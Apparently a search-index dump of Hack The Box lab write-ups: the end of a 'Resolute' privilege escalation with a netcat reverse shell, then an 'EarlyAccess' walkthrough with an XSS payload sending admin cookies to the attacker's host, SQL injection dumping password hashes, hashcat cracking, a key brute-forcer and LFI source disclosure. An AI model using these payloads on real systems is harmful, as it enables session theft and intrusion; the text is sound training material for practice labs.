SERVICE_EXIT_CODE : 0 (0x0) CHECKPOINT : 0x0 WAIT_HINT : 0x0\nEvil-WinRM PS C:&gt; sc.exe \\Resolute start dns SERVICE_NAME: dns TYPE : 10 WIN32_OWN_PROCESS STATE : 2 START_PENDING (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN) WIN32_EXIT_CODE : 0 (0x0) SERVICE_EXIT_CODE : 0 (0x0) CHECKPOINT : 0x0 WAIT_HINT : 0x7d0 PID : 3500 FLAGS :\nroot@p3:/opt/scanners/linux# nc -lvnp 4400 listening on [any] 4400 … connect to [10.10.14.3] from (UNKNOWN) [10.10.10.169] 49941 Microsoft Windows [Version 10.0.14393]\n\n2016 Microsoft Corporation. All rights reserved.\n\nC:&gt;whoami nt authority C:&gt;type C:.txt e1d9****************************\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██╗███╗ ██╗███████╗ ██████╗ ██████╗ ███╗ ███╗ █████╗ ████████╗██╗ ██████╗ ███╗ ██╗ ██║████╗ ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗ ██║ ██║██╔██╗ ██║█████╗ ██║ ██║██████╔╝██╔████╔██║███████║ ██║ ██║██║ ██║██╔██╗ ██║ ██║██║╚██╗██║██╔══╝ ██║ ██║██╔══██╗██║╚██╔╝██║██╔══██║ ██║ ██║██║ ██║██║╚██╗██║ ██║██║ ╚████║██║ ╚██████╔╝██║ ██║██║ ╚═╝ ██║██║ ██║ ██║ ██║╚██████╔╝██║ ╚████║ ╚═╝╚═╝ ╚═══╝╚═╝ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚═╝ ╚═╝ ╚═╝ ╚═╝ ╚═════╝ ╚═╝ ╚═══╝\nDnsAdmin https://adsecurity.org/?p=4064 http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise https://www.youtube.com/watch?v=JyZB2XLLPTc http://www.abhizer.com/windows-privilege-escalation-dnsadmin-to-domaincontroller/\nMSFVenom https://liberty-shell.com/sec/2018/02/10/msfv/"
  },
  {
    "objectID": "posts/2021-09-14-htb-writeup-earlyaccess/2021-09-14-htb-writeup-earlyaccess.html",
    "href": "posts/2021-09-14-htb-writeup-earlyaccess/2021-09-14-htb-writeup-earlyaccess.html",
    "title": "EarlyAccess - Hack The Box",
    "section": "",
    "text": "USER\n\nStep 1\nStandard enum with nmap, dirb, nikto, ffuf.\nNMAP:\n┌──(void㉿void)-[/git/htb/earlyaccess]\n└─$ nmap -Pn -n -sCV 10.10.11.110\nHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-09-14 12:29 CEST\nNmap scan report for 10.10.11.110\nHost is up (0.027s latency).\nNot shown: 997 closed ports\nPORT    STATE SERVICE  VERSION\n22/tcp  open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)\n| ssh-hostkey: \n|   2048 e4:66:28:8e:d0:bd:f3:1d:f1:8d:44:e9:14:1d:9c:64 (RSA)\n|   256 b3:a8:f4:49:7a:03:79:d3:5a:13:94:24:9b:6a:d1:bd (ECDSA)\n|_  256 e9:aa:ae:59:4a:37:49:a6:5a:2a:32:1d:79:26:ed:bb (ED25519)\n80/tcp  open  http     Apache httpd 2.4.38\n|_http-server-header: Apache/2.4.38 (Debian)\n|_http-title: Did not follow redirect to https://earlyaccess.htb/\n443/tcp open  ssl/http Apache httpd 2.4.38 ((Debian))\n|_http-server-header: Apache/2.4.38 (Debian)\n|_http-title: EarlyAccess\n| ssl-cert: Subject: commonName=earlyaccess.htb/organizationName=EarlyAccess Studios/stateOrProvinceName=Vienna/countryName=AT\n| Not valid before: 2021-08-18T14:46:57\n|_Not valid after:  2022-08-18T14:46:57\n|_ssl-date: TLS randomness does not represent time\n| tls-alpn: \n|_  http/1.1\nService Info: Host: 172.18.0.102; OS: Linux; CPE: cpe:/o:linux:linux_kernel\nDIRB:\n┌──(void㉿void)-[~/Documents/scanners/linux]\n└─$ dirb https://10.10.11.110                                                     \n\nURL_BASE: https://10.10.11.110/\nWORDLIST_FILES: /usr/share/dirb/wordlists/common.txt\n\n---- Scanning URL: https://10.10.11.110/ ----\n+ https://10.10.11.110/index.html (CODE:200|SIZE:406)\nNIKTO:\n┌──(void㉿void)-[~/Documents/scanners/linux]\n└─$ nikto -h https://10.10.11.110\n- Nikto v2.1.6\n---------------------------------------------------------------------------\n+ Target IP:          10.10.11.110\n+ Target Hostname:    10.10.11.110\n+ Target Port:        443\n---------------------------------------------------------------------------\n+ SSL Info:        Subject:  /C=AT/ST=Vienna/L=Vienna/O=EarlyAccess Studios/OU=BlockPage/CN=earlyaccess.htb/emailAddress=chr0x6eos@earlyaccess.htb\n                   Ciphers:  ECDHE-RSA-AES256-GCM-SHA384\n                   Issuer:   /C=AT/ST=Vienna/L=Vienna/O=EarlyAccess Studios/OU=BlockPage/CN=earlyaccess.htb/emailAddress=chr0x6eos@earlyaccess.htb\n+ Start Time:         2021-09-14 12:30:26 (GMT2)\n---------------------------------------------------------------------------\n+ Server: nginx/1.14.2\n..\n+ The site uses SSL and the Strict-Transport-Security HTTP header is not defined.\n+ The site uses SSL and Expect-CT header is not present.\n+ The Content-Encoding header is set to \"deflate\" this may mean that the server is vulnerable to the BREACH attack.\n+ Hostname '10.10.11.110' does not match certificate's names: earlyaccess.htb\n+ Server banner has changed from 'nginx/1.14.2' to 'Apache/2.4.38 (Debian)' which may suggest a WAF, load balancer or proxy is in place\n+ Retrieved x-powered-by header: PHP/7.4.21\n+ Cookie XSRF-TOKEN created without the secure flag\n+ Cookie XSRF-TOKEN created without the httponly flag\n+ Cookie earlyaccess_session created without the secure flag\n+ Cookie earlyaccess_session created without the httponly flag\nFFUF:\n┌──(void㉿void)-[/git/htb/earlyaccess]\n└─$ ffuf -c -w /usr/share/wordlists/dirb/big.txt -u https://earlyaccess.htb/ -H \"Host: https://FUZZ.earlyaccess.htb\" -fw 83\n..\nN/A\nUsing the different enum tools triggers the WAF which bans us for 1 minute.\n┌──(void㉿void)-[/git/htb/earlyaccess]\n└─$ curl -vk https://earlyaccess.htb                                               \n..\n&gt; GET / HTTP/1.1\n&gt; Host: earlyaccess.htb\n&lt; HTTP/1.1 200 OK\n&lt;\n&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n&lt;title&gt;Banned&lt;/title&gt;\n&lt;style&gt;\n    body {\n        width: 35em;\n        margin: 0 auto;\n        font-family: Tahoma, Verdana, Arial, sans-serif;\n    }\n&lt;/style&gt;\n&lt;/head&gt;\n&lt;body&gt;\n    &lt;h1&gt;You are banned!&lt;/h1&gt;\n    &lt;body&gt;\n        Our WAF detected suspicious traffic coming from your IP! You are temporarily banned from accessing the webpage for one minute.\n    &lt;/body&gt;\n&lt;/body&gt;\n&lt;/html&gt;\nTrying to bypass the WAF using simple HTTP Headers still result in a temporary ban.\n┌──(void㉿void)-[/git/htb/earlyaccess]\n└─$ ffuf -c -w /usr/share/wordlists/dirb/common.txt -u https://earlyaccess.htb/FUZZ -H \"X-Originating-IP: 127.0.0.1, X-Forwarded-For: 127.0.0.1, X-Remote-IP: 127.0.0.1, X-Remote-Addr: 127.0.0.1, X-Client-IP: 127.0.0.1\"\n\n\n\nStep 2\nBrowsing through the website we find: - chr0x6eos@earlyaccess.htb (from the SSL Cert) - admin@earlyaccess.htb in the page footer - We are able to register an account and login\nLets start by register an account, test1@asd.as:123123123. Reading through the Forums message board we find:\n\nHello Game-Corp Team!\nI have found a critical bug in the game-scoreboard.\nMy username returns strange errors on the scoreboard. Please fix this issue!\nThanks, SingleQuoteMan &gt;Hey SingleQuoteMan, &gt; Thank you for reaching out to us.\nOur internal team has already added this to our Bug-Tracker and is currently working on resolving this issue permanently. For now, a temporary fix was issued that prevents creation of accounts with invalid usernames. (Your account is also affected by this change!)\nWe are incredibly sorry for the inconvenience this has caused and will update you as soon as we have resolved this problem. Please feel welcome to reach out to us with any further questions you may as we would be more than happy to help. &gt; Take care, your Support-Team\n\nVulnerable name-field? Possible to do SQLi and/or XSS?\n\nI have recently bought an Early Access Game-Key from your store, however now that I am trying to register the key to my account I keep getting errors. This is the error I get: “Game-key is invalid! If this issue persists, please contact the admin!” &gt;Hello 3lit3H4kr, &gt; Thank you for reaching out to us.\nDue to the high load of traffic our Game-Key verification-API is currently experiencing issues. We are implementing a solution to fallback to manual verification by the support staff.\nPlease use the contact form to privately contact an administrative user and send the Game-Key for manual verification. We are incredibly sorry for the inconvenience this has caused you. We are doing our best to resolve this issue promptly. &gt; Take care, your Support-Team\n\nPossible to steal an admin cookie through XSS? As both posts hints, I should probably play around with the name field in the profile settings in order to steal an admin cookie.\nName: &lt;script&gt;var i=new Image;i.src=\"https://10.10.14.2/?\"+document.cookie;&lt;/script&gt;\n![[earlyaccess-01.png]]\nSend an mail using the website contact form, setup a listener and wait for incoming cookie.\n┌──(void㉿void)-[/git/htb/earlyaccess]\n└─$ nc -lvnp 443                                                                                                                  1 ⨯\nlistening on [any] 443 ...\nconnect to [10.10.14.2] from (UNKNOWN) [10.10.11.110] 46374\n?Kz�+ٖ0� [���踎Ml4f���I��Uk��P   r�j ���+�/�,�0̨̩����/5����\n\njj\n  #\n3+)jj �Ξ�N��D���|��ŭ���κ����1-+\n\n��\n  ih2**�  \nThe message seems to be encrypted. We probably need to setup a HTTPS server in order to grab the cookie.\n┌──(void㉿void)-[/git/htb/earlyaccess]\n└─$ sudo python3 simple-https-server.py\n10.10.11.110 - - [14/Sep/2021 16:08:30] \"GET /?XSRF-TOKEN=eyJpdiI6InNmd2VuaEpxMXI5aWQvNzNpajRvQkE9PSIsInZhbHVlIjoicGhXcjM3dnhrc2JPNFVwLzRzSWUxRU0zMGp0TTl1MW9xQXdYKzdRRXZ2MFMrcVlBSUhZZjdxTWQvLytQRE1MdlVHYnh4VEtKbXdQMzUzMldsVjNLSEsxM3dvM3hVYmRzVHI1cnliQXlsK29WY0JaN0hzMEthVlBrSXF5Q0VBSVkiLCJtYWMiOiJkYzY5MGIxZTY3Zjk5YzM2MmQ3OWViNGVhODRmNDJkM2NkMmQwMDhlMzQ2Y2NkNDBjZTdmM2VkMGQzZjcxZTAxIn0%3D;%20earlyaccess_session=eyJpdiI6IjZ1ZWpFdlhBL0xQcHdFanRmTkM5aFE9PSIsInZhbHVlIjoiQ3Z0M0RwdExoZ1VqblhOWWMyTHNQa1d1aVczdVQvdnNRNk5ac0txTGF3Nkw4YmpGVDRxUmp0Q2l6NFY1Z1Jmcm5MVk44d0pXdFJWYWNzck8xQW1pRXpPTGl3dHdub0d6YzBUN2xqa21qbnpONkdVaHFjd2dQTngzZzRMWVl1Q1EiLCJtYWMiOiJjOTJkYmI2ODU4MzYyOTFhMWNiNjVjYjE0YTVkZDQ2NDc4ZGJlY2MzYTY0MzAwMGZiNzZlZTFjYjE3YTYyYzUzIn0%3D HTTP/1.1\" 200 -\nChange the XSRF-TOKEN and earlyaccess_session in the browser, update and we are now admin!\n![[earlyaccess-02.png]]\n\n\n\nStep 3\nBoth the Dev and Game vhost seems to be locked behind additional authentication at this stage, however from Admin we are able to download a backup file to validate game keys. Looking through each line of the code we should be able to reverse the script and thus get a valid key.\nFirst section checks if key is in valid format (ex. AAAAA-BBBBB-CCCC1-DDDDD-1234)\ndef valid_format(self) -&gt; bool:\n        return bool(match(r\"^[A-Z0-9]{5}(-[A-Z0-9]{5})(-[A-Z]{4}[0-9])(-[A-Z0-9]{5})(-[0-9]{1,5})$\", self.key))\nSecond section strips the fifth (last) group of the key, and calculates the combined ASCII Decimal value of group 1,2,3 and 4. The last, stripped, group will be used at a later stage as a checksum for verification - comparing to the combined value.\ndef calc_cs(self) -&gt; int:\n        gs = self.key.split('-')[:-1]\n        return sum([sum(bytearray(g.encode())) for g in gs])\n&gt;&gt;&gt; a = \"AAAAA-BBBBB-CCCC1-DDDDD-1234\"\n&gt;&gt;&gt; b = a.split('-')[:-1]\n&gt;&gt;&gt; print(b)\n['AAAAA', 'BBBBB', 'CCCC1', 'DDDDD']\n&gt;&gt;&gt; print(sum([sum(bytearray(g.encode())) for g in b]))\n1312\nThird section (first group) calculates that the value of the three first letters of the key to spell out K E Y, the fourth and fifth character is checked to see if it’s an integer and lastly the length is checked before moving to next function.\nValid first group could be: KEY01\ndef g1_valid(self) -&gt; bool:\n        g1 = self.key.split('-')[0]\n        r = [(ord(v)&lt;&lt;i+1)%256^ord(v) for i, v in enumerate(g1[0:3])]\n        if r != [221, 81, 145]:\n            return False\n        for v in g1[3:]:\n            try:\n                int(v)\n            except:\n                return False\n        return len(set(g1)) == len(g1)\n&gt;&gt;&gt; g1 = \"KEY01\"\n&gt;&gt;&gt; r = [(ord(v)&lt;&lt;i+1)%256^ord(v) for i, v in enumerate(g1[0:3])]\n&gt;&gt;&gt; print(r)\n[221, 81, 145]\n&gt;&gt;&gt; print(g1[3])\n0\n&gt;&gt;&gt; print(len(set(g1)))\n5\n&gt;&gt;&gt; print(len(g1))\n5\nForth section (second group) divides the key in two parts, p1 containing character 1,3 and 5 of the key, and p2 containing character 2 and 4. The sum function calculates the ASCII decimal value of p1 and p2, and then compares them to each other. p1 and p2 must be equal to pass as valid.\nValid second group could be: 1J1I1\ndef g2_valid(self) -&gt; bool:\n        g2 = self.key.split('-')[1]\n        p1 = g2[::2]\n        p2 = g2[1::2]\n        return sum(bytearray(p1.encode())) == sum(bytearray(p2.encode()))\n&gt;&gt;&gt; g2 = \"12345\"\n&gt;&gt;&gt; p1 = g2[::2]\n&gt;&gt;&gt; print(p1)\n135\n&gt;&gt;&gt; p2 = g2[1::2]\n&gt;&gt;&gt; print(p2)\n24\n&gt;&gt;&gt; p1 = \"1\"\n&gt;&gt;&gt; print(p1.encode())\nb'1'\n&gt;&gt;&gt; print(sum(p1.encode()))\n49\n&gt;&gt;&gt; 49*3\n147\n&gt;&gt;&gt; p2 = \"J\"\n&gt;&gt;&gt; print(p2.encode())\nb'J'\n&gt;&gt;&gt; print(sum(p2.encode()))\n74\n&gt;&gt;&gt; g2 = \"1J1I1\"\n&gt;&gt;&gt; p1 = g2[::2]\n&gt;&gt;&gt; p2 = g2[1::2]\n&gt;&gt;&gt; print(sum(bytearray(p1.encode())))\n147\n&gt;&gt;&gt; print(sum(bytearray(p2.encode())))\n147\nFifth section (third group) checks if the first two characters of the groups are equal to magic_value which is statically assigned to XP, at the start of the code. If the first check passes, then the whole group is check to see if it’s total decimal value (sum) is equal to magic_num, which is statically assigned to 346, at the start of the code.\nThe ASCII decimal value of XP is 168, meaning our three remaining characters should have a combined value of 178.\nKeep note that third group needs to follow the format: [A-Z]{4}[0-9]\nValid third group could be: XPAA0\ndef g3_valid(self) -&gt; bool:\n        # TODO: Add mechanism to sync magic_num with API\n        g3 = self.key.split('-')[2]\n        if g3[0:2] == self.magic_value:\n            return sum(bytearray(g3.encode())) == self.magic_num\n        else:\n            return False\n&gt;&gt;&gt; g3 = \"12345\"\n&gt;&gt;&gt; print(g3[0:2])\n12\n&gt;&gt;&gt; start = \"XP\"\n&gt;&gt;&gt; print(sum(start.encode()))\n168\n&gt;&gt;&gt; 346-168\n178\n&gt;&gt;&gt; end = \"AA0\"\n&gt;&gt;&gt; print(sum(end.encode()))\n178\nSixth section (fourth group) compares the first group with the fourth group, character by character, converts it to ASCII decimal and calculates the mod value of the two. The mod value must be equal to 12, 4, 20, 117, 0.\nValid fourth group could be: GAME1\ndef g4_valid(self) -&gt; bool:\n        return [ord(i)^ord(g) for g, i in zip(self.key.split('-')[0], self.key.split('-')[3])] == [12, 4, 20, 117, 0]\n&gt;&gt;&gt; print(ord(\"K\"))\n75\n&gt;&gt;&gt; print(ord(\"G\"))\n71\n&gt;&gt;&gt; print(ord(\"K\")^ord(\"G\"))\n12\n&gt;&gt;&gt; print(ord(\"E\"))\n69\n&gt;&gt;&gt; print(ord(\"A\"))\n65\n&gt;&gt;&gt; print(ord(\"E\")^ord(\"A\"))\n4\n&gt;&gt;&gt; print(ord(\"Y\"))\n89\n&gt;&gt;&gt; print(ord(\"M\"))\n77\n&gt;&gt;&gt; print(ord(\"Y\")^ord(\"M\"))\n20\n&gt;&gt;&gt; print(ord(\"0\"))\n48\n&gt;&gt;&gt; print(ord(\"E\"))\n69\n&gt;&gt;&gt; print(ord(\"0\")^ord(\"E\"))\n117\n&gt;&gt;&gt; print(ord(\"1\")^ord(\"1\"))\n0\nChecksum verification (fifth group) is done by comparing the combined ASCII decimal sum of the four first groups, compared to the value of the fifth group.\ndef calc_cs(self) -&gt; int:\n        gs = self.key.split('-')[:-1]\n        return sum([sum(bytearray(g.encode())) for g in gs])\n\ndef cs_valid(self) -&gt; bool:\n        cs = int(self.key.split('-')[-1])\n        return self.calc_cs() == cs\n&gt;&gt;&gt; key = \"KEY01-1J1I1-XPAA0-GAME1-1301\"\n&gt;&gt;&gt; gs = key.split('-')[:-1]\n&gt;&gt;&gt; print(gs)\n['KEY01', '1J1I1', 'XPAA0', 'GAME1']\n&gt;&gt;&gt; print(sum([sum(bytearray(g.encode())) for g in gs]))\n1301\n&gt;&gt;&gt; cs = int(key.split('-')[-1])\n&gt;&gt;&gt; print(cs)\n1301\nA valid key should be: KEY01-1J1I1-XPAA0-GAME1-1301\nTesting it out, and we’ve reversed a key!\n┌──(void㉿void)-[/git/htb/earlyaccess]\n└─$ python3 validate.py KEY01-1J1I1-XPAA0-GAME1-1301\nEntered key is valid!\n\n\n\nStep 4\nEven though the key is correct in our offline validator, it fails when validating it online. This probably have something to do with this. &gt;Since the API has been down a lot lately, we have come up with an temporary solution. As requested, an offline backup of the game-key validator algorithm is now available to all administrative users. To use this, the magic_num must be entered into the validator app.\nAnd in the code we find: magic_num = 346 # TODO: Sync with API (api generates magic_num every 30min)\n![[earlyaccess-03.png]]\nWe need to find a way to extract the magic_num value from the API, or by other means. After trying to find and/or extract the magic_num for a while without success, I decided to go the scripting route and brute force all possible keys. The unknown variable only affects two characters in the third group, plus the last checksum group of the key.\n┌──(void㉿void)-[/git/htb/earlyaccess]\n└─$ cat m.py \n#!/usr/bin/env python3\n\nnum = 955                   # Ascii decimal value of group 1,2,4\nvalid_key = \"KEY01-1J1I1-XPAA0-GAME1-1301\"\ng1 = valid_key.split('-')[0]\ng2 = valid_key.split('-')[1]\ng3 = valid_key.split('-')[2]\ng4 = valid_key.split('-')[3]\ng5 = valid_key.split('-')[4]\n\ng3_a = ['X', 'P', 'A', 'A', '0']\ng32 = ord('A')\n\nwhile g32 &lt;= ord('Z'):\n    \n    g33 = ord('A')\n    while g33 &lt;= ord('Z'):\n        g3_a[3] = chr(g33)\n        magic_num = (ord(g3_a[0]) + ord(g3_a[1]) + ord(g3_a[2]) + ord(g3_a[3]) + ord(g3_a[4]))\n        checksum = magic_num + num\n        print(f\"{g1}-{g2}-XP{g3_a[2]}{g3_a[3]}0-{g4}-{checksum}\")\n        g33 +=1\n\n    g3_a[2] = chr(g32)\n    g32 +=1\n┌──(void㉿void)-[/git/htb/earlyaccess]\n└─$ sudo python3 m.py               \nKEY01-1J1I1-XPAA0-GAME1-1301\nKEY01-1J1I1-XPAB0-GAME1-1302\nKEY01-1J1I1-XPAC0-GAME1-1303\nKEY01-1J1I1-XPAD0-GAME1-1304\nKEY01-1J1I1-XPAE0-GAME1-1305\nKEY01-1J1I1-XPAF0-GAME1-1306\nKEY01-1J1I1-XPAG0-GAME1-1307\nKEY01-1J1I1-XPAH0-GAME1-1308\nKEY01-1J1I1-XPAI0-GAME1-1309\nKEY01-1J1I1-XPAJ0-GAME1-1310\n..\n┌──(void㉿void)-[/git/htb/earlyaccess]\n└─$ wc -l all_keys.txt \n676 all_keys.txt\nThe script successfully brute forced 676 possible valid keys, depending on what the magic_num variable is set to. Fire up Burp, and brute force using intruder (remember to follow redirects).\nOut of the 676 total keys we get 11 keys that pass as valid! However nothing really happens. ![[earlyaccess-04.png]]\nTrying to brute force a key as a user (p3test@test.se:123123123) however gives us access to the Game tab in the page header.\n\n\n\nStep 5\nPress the tab and login to https://game.earlyaccess.htb with your account. In the Global Leaderboard we find three users: - chr0x6eos@earlyaccess.htb - farbs@earlyaccess.htb - firefart@earlyaccess.htb\nOn the Scoreboard we can see our own results. In step 2 we found a clue that the scoreboard would break to SQL input, so if we change our username to ' and visit the scoreboard again we get the output:\n\nError\nSQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ’’’‘) ORDER BY scoreboard.score DESC LIMIT 11’ at line 1\n\nTrying to understand the query it probably looks something like this: select from game where username=('dude') ORDER BY scoreboard.score DESC LIMIT 11\nTo input only ' as user wouldn’t make sense in that query, we probably need to close of the parenthesis first and then do our injection. Changing the username to ') order by 4;-- -# gives us the error: &gt;Error &gt; &gt;SQLSTATE[42S22]: Column not found: 1054 Unknown column ‘4’ in ‘order clause’\nMeaning the number of columns is 3 (as order by 3 gives no output). Enumerate the database using ') union all select RANDOM-SQL-COMMAND,2,3;-- -#.\n\n\n\n\n\n\n\nCommand\nOutput\n\n\n\n\n@@version\n8.0.25\n\n\nuser()\ngame@172.18.0.102\n\n\ndatabase()\ndb\n\n\ntable_name FROM information_schema.TABLES WHERE table_schema=‘db’\nfailed_logins, scoreboard, users\n\n\ncolumn_name FROM information_schema.COLUMNS WHERE table_name=‘users’\nid, name, email, password, role, key, created_at, updated_at\n\n\nconcat(name,0x3a,password),2,3 FROM users\nadmin:618292e936625aca8df61d5fff5c06837c49e491 chr0x6eos:d997b2a79e4fc48183f59b2ce1cee9da18aa5476 firefart:584204a0bbe5e392173d3dfdf63a322c83fe97cd farbs:290516b5f6ad161a86786178934ad5f933242361\n\n\n\nAdd all the hashes to a file and crack them using hashcat.\n┌──(void㉿void)-[/git/htb/earlyaccess]\n└─$ cat hashes.hash \n618292e936625aca8df61d5fff5c06837c49e491\nd997b2a79e4fc48183f59b2ce1cee9da18aa5476\n584204a0bbe5e392173d3dfdf63a322c83fe97cd \n290516b5f6ad161a86786178934ad5f933242361\n   \n┌──(void㉿void)-[/git/htb/earlyaccess]\n└─$ echo -n 618292e936625aca8df61d5fff5c06837c49e491 | wc -c      \n40\n   \n┌──(void㉿void)-[/git/htb/earlyaccess]\n└─$ hashcat -a0 -m100 hashes.hash /usr/share/wordlists/rockyou.txt\n..\n618292e936625aca8df61d5fff5c06837c49e491:gameover\nApproaching final keyspace - workload adjusted.  \n                         \nSession..........: hashcat\nStatus...........: Exhausted\nHash.Name........: SHA1\nHash.Target......: hashes.hash\nCracked creds = admin:gameover\n\n\n\nStep 6\nWe are now able to login on http://dev.earlyaccess.htb using the cracked admin creds.\nThere are two tools, Hashing- and File-Tools. The hashing tool allows us to make a MD5 or SHA1 hash of a password. Capturing the request we see a POST to /actions/hash.php.\nLooking on the File-Tool however there are no UI available, but applying the same logic the request should be made to /actions/file.php.\n┌──(void㉿void)-[~/Documents/shells/php]\n└─$ curl http://dev.earlyaccess.htb/actions/file.php                               \n&lt;h1&gt;ERROR:&lt;/h1&gt;Please specify file!                                                                                                                                      \n┌──(void㉿void)-[~/Documents/shells/php]\n└─$ curl http://dev.earlyaccess.htb/actions/file.php?file=/etc/passwd\n&lt;h1&gt;ERROR:&lt;/h1&gt;Please specify file!                                                                                                                    \n┌──(void㉿void)-[~/Documents/shells/php]\n└─$ curl http://dev.earlyaccess.htb/actions/file.php?filepath=/etc/passwd\n&lt;h1&gt;ERROR:&lt;/h1&gt;For security reasons, reading outside the current directory is prohibited!\nWe got RFI, however we’re not allowed to read outside the current directory.\n┌──(void㉿void)-[~/Documents/shells/php]\n└─$ curl -v http://dev.earlyaccess.htb/actions/file.php?filepath=hash.php\n&lt;h2&gt;Executing file:&lt;/h2&gt;&lt;p&gt;hash.php&lt;/p&gt;\n&lt;br /&gt;\n&lt;b&gt;Warning&lt;/b&gt;:  Cannot modify header information - headers already sent by (output started at /var/www/earlyaccess.htb/dev/actions/file.php:18) in &lt;b&gt;/var/www/earlyaccess.htb/dev/actions/hash.php&lt;/b&gt; on line &lt;b&gt;77&lt;/b&gt;&lt;br /&gt;\n* Connection #0 to host dev.earlyaccess.htb left intact\n&lt;h2&gt;Executed file successfully!\nThe warning message shows the absolute path: /var/www/earlyaccess.htb/dev/actions/ Playing around further with the RFI we can see that the function used in the File-Tool is require_once():\n&lt;b&gt;Fatal error&lt;/b&gt;:  require_once(): Failed opening required '\\\\10.10.14.2\\share\\rev.php' (include_path='.:.') in &lt;b&gt;/var/www/earlyaccess.htb/dev/actions/file.php&lt;/b&gt; on line &lt;b&gt;19&lt;/b&gt;```\nReading on HackTricks: &gt;The vulnerability (LFI/RFI) occurs when the user can control in some way the file that is going to be load by the server. &gt; Vulnerable PHP functions: require, require_once, include, include_once\nAfter some research I come across php://filter/convert.base64-encode/resource=, we can use this to extract hash.php in order to see if there’s anything that we’ve missed.\n┌──(void㉿void)-[~/Documents/shells/php]\n└─$ curl http://dev.earlyaccess.htb/actions/file.php?filepath=php://filter/convert.base64-encode/resource=/var/www/earlyaccess.htb/dev/actions/hash.php\n&lt;h2&gt;Executing file:&lt;/h2&gt;&lt;p&gt;php://filter/convert.base64-encode/resource=/var/www/earlyaccess.htb/dev/actions/hash.php&lt;/p&gt;\nPD9waHAKaW5jbHVkZV9vbmNlICIuLi9pbmNsdWRlcy9zZXNzaW9uLnBocCI7CgpmdW5jdGlvbiBoYXNoX3B3KCRoYXNoX2Z1bmN0aW9uLCAkcGFzc3dvcmQpCnsKICAgIC8vIERFVkVMT1BFUi1OT1RFOiBUaGVyZSBoYXMgZ290dGEgYmUgYW4gZWFzaWVyIHdheS4uLgogICAgb2Jfc3RhcnQoKTsKICAgIC8vIFVzZSBpbnB1dHRlZCBoYXNoX2Z1bmN0aW9uIHRvIGhhc2ggcGFzc3dvcmQKICAgICRoYXNoID0gQCRoYXNoX2Z1bmN0aW9uKCRwYXNzd29yZCk7CiAgICBvYl9lbmRfY2xlYW4oKTsKICAgIHJldHVybiAkaGFzaDsKfQoKdHJ5CnsKICAgIGlmKGlzc2V0KCRfUkVRVUVTVFsnYWN0aW9uJ10pKQogICAgewogICAgICAgIGlmKCRfUkVRVUVTVFsnYWN0aW9uJ10gPT09ICJ2ZXJpZnkiKQogICAgICAgIHsKICAgICAgICAgICAgLy8gVkVSSUZJRVMgJHBhc3N3b3JkIEFHQUlOU1QgJGhhc2gKCiAgICAgICAgICAgIGlmKGlzc2V0KCRfUkVRVUVTVFsnaGFzaF9mdW5jdGlvbiddKSAmJiBpc3NldCgkX1JFUVVFU1RbJ2hhc2gnXSkgJiYgaXNzZXQoJF9SRVFVRVNUWydwYXNzd29yZCddKSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgLy8gT25seSBhbGxvdyBjdXN0b20gaGFzaGVzLCBpZiBgZGVidWdgIGlzIHNldAogICAgICAgICAgICAgICAgaWYoJF9SRVFVRVNUWydoYXNoX2Z1bmN0aW9uJ10gIT09ICJtZDUiICYmICRfUkVRVUVTVFsnaGFzaF9mdW5jdGlvbiddICE9PSAic2hhMSIgJiYgIWlzc2V0KCRfUkVRVUVTVFsnZGVidWcnXSkpCiAgICAgICAgICAgICAgICAgICAgdGhyb3cgbmV3IEV4Y2VwdGlvbigiT25seSBNRDUgYW5kIFNIQTEgYXJlIGN1cnJlbnRseSBzdXBwb3J0ZWQhIik7CgogICAgICAgICAgICAgICAgJGhhc2ggPSBoYXNoX3B3KCRfUkVRVUVTVFsnaGFzaF9mdW5jdGlvbiddLCAkX1JFUVVFU1RbJ3Bhc3N3b3JkJ10pOwoKICAgICAgICAgICAgICAgICRfU0VTU0lPTlsndmVyaWZ5J10gPSAoJGhhc2ggPT09ICRfUkVRVUVTVFsnaGFzaCddKTsKICAgICAgICAgICAgICAgIGhlYWRlcignTG9jYXRpb246IC9ob21lLnBocD90b29sPWhhc2hpbmcnKTsKICAgICAgICAgICAgICAgIHJldHVybjsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBlbHNlaWYoJF9SRVFVRVNUWydhY3Rpb24nXSA9PT0gInZlcmlmeV9maWxlIikKICAgICAgICB7CiAgICAgICAgICAgIC8vVE9ETzogSU1QTEVNRU5UIEZJTEUgVkVSSUZJQ0FUSU9OCiAgICAgICAgfQogICAgICAgIGVsc2VpZigkX1JFUVVFU1RbJ2FjdGlvbiddID09PSAiaGFzaF9maWxlIikKICAgICAgICB7CiAgICAgICAgICAgIC8vVE9ETzogSU1QTEVNRU5UIEZJTEUtSEFTSElORwogICAgICAgIH0KICAgICAgICBlbHNlaWYoJF9SRVFVRVNUWydhY3Rpb24nXSA9PT0gImhhc2giKQogICAgICAgIHsKICAgICAgICAgICAgLy8gSEFTSEVTICRwYXNzd29yZCBVU0lORyAkaGFzaF9mdW5jdGlvbgoKICAgICAgICAgICAgaWYoaXNzZXQoJF9SRVFVRVNUWydoYXNoX2Z1bmN0aW9uJ10pICYmIGlzc2V0KCRfUkVRVUVTVFsncGFzc3dvcmQnXSkpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIC8vIE9ubHkgYWxsb3cgY3VzdG9tIGhhc2hlcywgaWYgYGRlYnVnYCBpcyBzZXQKICAgICAgICAgICAgICAgIGlmKCRfUkVRVUVTVFsnaGFzaF9mdW5jdGlvbiddICE9PSAibWQ1IiAmJiAkX1JFUVVFU1RbJ2hhc2hfZnVuY3Rpb24nXSAhPT0gInNoYTEiICYmICFpc3NldCgkX1JFUVVFU1RbJ2RlYnVnJ10p